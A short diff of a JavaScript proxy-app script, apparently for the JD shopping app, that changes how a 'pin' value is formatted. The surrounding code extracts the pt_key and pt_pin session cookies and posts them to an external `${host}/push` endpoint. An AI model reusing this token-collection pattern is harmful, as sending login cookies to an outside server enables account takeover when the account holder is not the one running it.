@@ -56,7 +56,7 @@ function GetCookie() {
                 const CookieValue = CV.match(/pt_key=.+?;/) + CV.match(/pt_pin=.+?;/);
                 //$.notify('京东APP','',"获取成功");
                 var pt_pin =CV.match(/pt_pin=.+?;/)
-                var pin ="pin="+pt_pin.toString().split('=')[1]
+                var pin = pt_pin.toString().split('=')[1]
                 let data = {"source": "jd_app", "type": "temp", "value": CookieValue, "pin": pin}
                 const opt = {url: `${host}/push`, body: JSON.stringify(data)};
                 $.http.post(opt).then((response) => JSON.parse(response.body));
